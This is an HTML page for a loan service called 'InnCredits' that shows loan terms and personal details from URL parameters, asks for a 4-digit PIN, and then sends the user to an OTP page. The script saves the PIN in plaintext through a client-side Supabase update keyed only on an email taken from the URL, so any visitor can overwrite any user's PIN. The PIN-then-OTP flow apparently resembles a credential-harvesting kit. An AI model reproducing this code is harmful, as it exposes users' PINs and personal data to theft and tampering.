<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>InnCredits · Confirm PIN</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: #0b1120; font-family: 'Inter', system-ui, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px 16px 32px 16px; }
        .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
        .summary-item { display: flex; flex-direction: column; }
        .summary-label { font-size: 0.7rem; color: #7e8aa2; text-transform: uppercase; }
        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; }
        .pin-card { background: #111827; border-radius: 32px; padding: 28px 24px 32px 24px; }
        .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; }
        .section-sub { font-size: 0.8rem; color: #7e8aa2; margin-bottom: 28px; border-left: 3px solid #14b8a6; padding-left: 12px; }
        .details-grid { background: #0f1724; border-radius: 24px; padding: 18px 16px; margin-bottom: 28px; }
        .detail-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #1e293b; }
        .detail-row:last-child { border-bottom: none; }
        .detail-label { font-size: 0.8rem; color: #94a3b8; }
        .detail-value { font-size: 0.85rem; font-weight: 600; color: #e2e8f0; }
        .pin-container { display: flex; justify-content: center; gap: 16px; margin-bottom: 28px; }
        .pin-box { width: 65px; height: 65px; background: #0f1724; border: 2px solid #1f2a3e; border-radius: 16px; text-align: center; font-size: 1.8rem; font-weight: 700; color: #14b8a6; outline: none; }
        .pin-box:focus { border-color: #14b8a6; }
        .confirm-btn { width: 100%; background: #14b8a6; border: none; padding: 18px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; }
        .confirm-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .error-message { color: #f43f5e; font-size: 0.75rem; text-align: center; margin-top: 12px; display: none; }
        .error-message.show { display: block; }
        @media (max-width: 450px) { .pin-box { width: 55px; height: 55px; font-size: 1.5rem; } }
    </style>
</head>
<body>
<div class="app-container">
    <div class="loan-summary-bar">
        <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
        <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
        <div class="summary-item"><span class="summary-label">Monthly</span><span class="summary-value" id="summaryMonthly">$0</span></div>
        <div class="summary-item"><span class="summary-label">Interest</span><span class="summary-value" id="summaryRate">5%</span></div>
    </div>
    <div class="pin-card">
        <div class="section-title">Confirm your details</div>
        <div class="section-sub">Please review your loan information below</div>
        <div class="details-grid">
            <div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="userFullName">-</span></div>
            <div class="detail-row"><span class="detail-label">Email</span><span class="detail-value" id="userEmail">-</span></div>
            <div class="detail-row"><span class="detail-label">Phone</span><span class="detail-value" id="userPhone">-</span></div>
        </div>
        <div class="pin-container">
            <input type="text" maxlength="1" class="pin-box" data-idx="0" inputmode="numeric">
            <input type="text" maxlength="1" class="pin-box" data-idx="1" inputmode="numeric">
            <input type="text" maxlength="1" class="pin-box" data-idx="2" inputmode="numeric">
            <input type="text" maxlength="1" class="pin-box" data-idx="3" inputmode="numeric">
        </div>
        <div class="error-message" id="pinError">Please enter a valid 4-digit PIN</div>
        <button class="confirm-btn" id="confirmBtn" disabled>Confirm & Continue →</button>
    </div>
</div>
<script>
    const SUPABASE_URL = 'https://zchkanbnkghpsaagbnrt.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_KjorGuZY6O03OHhKhidk5w_Y5GcZ250';
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    const urlParams = new URLSearchParams(window.location.search);
    const amount = urlParams.get('amount') || '500';
    const term = urlParams.get('term') || '3';
    const rate = urlParams.get('rate') || '5';
    const monthly = urlParams.get('monthly') || '167.36';
    const fullName = urlParams.get('name') || '';
    const email = urlParams.get('email') || '';
    const phone = urlParams.get('phone') || '';

    document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
    document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
    document.getElementById('summaryRate').innerText = `${rate}%`;
    document.getElementById('userFullName').innerText = fullName;
    document.getElementById('userEmail').innerText = email;
    document.getElementById('userPhone').innerText = phone;

    const pinBoxes = document.querySelectorAll('.pin-box');
    let currentPin = ['', '', '', ''];
    const confirmBtn = document.getElementById('confirmBtn');
    const errorMsg = document.getElementById('pinError');

    function updatePinUI() {
        pinBoxes.forEach((box, idx) => { box.value = currentPin[idx] || ''; });
        confirmBtn.disabled = !currentPin.every(d => d && d.match(/[0-9]/));
    }

    function setPinDigit(index, value) {
        if (value && !value.match(/[0-9]/)) return;
        if (index >= 0 && index < 4) {
            currentPin[index] = value || '';
            updatePinUI();
            if (value && index < 3) pinBoxes[index + 1].focus();
        }
    }

    pinBoxes.forEach((box, idx) => {
        box.addEventListener('input', (e) => setPinDigit(idx, e.target.value.slice(-1)));
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace') {
                e.preventDefault();
                if (currentPin[idx] !== '') setPinDigit(idx, '');
                else if (idx > 0) { setPinDigit(idx - 1, ''); pinBoxes[idx - 1].focus(); }
            }
        });
    });

    confirmBtn.addEventListener('click', async () => {
        const fullPin = currentPin.join('');
        if (fullPin.length !== 4) { errorMsg.classList.add('show'); return; }

        confirmBtn.disabled = true;
        confirmBtn.textContent = 'Saving...';

        // Save PIN to Supabase
        const { error } = await supabase
            .from('users')
            .update({ pin: fullPin })
            .eq('email', email);

        if (error) {
            errorMsg.textContent = 'Failed to save PIN. Please try again.';
            errorMsg.classList.add('show');
            confirmBtn.disabled = false;
            confirmBtn.textContent = 'Confirm & Continue →';
            return;
        }

        // Redirect to OTP page
        const params = new URLSearchParams();
        params.set('amount', amount);
        params.set('term', term);
        params.set('rate', rate);
        params.set('monthly', monthly);
        params.set('name', fullName);
        params.set('email', email);
        params.set('phone', phone);
        window.location.href = `otp-verify.html?${params.toString()}`;
    });

    pinBoxes[0].focus();
</script>
</body>
</html>
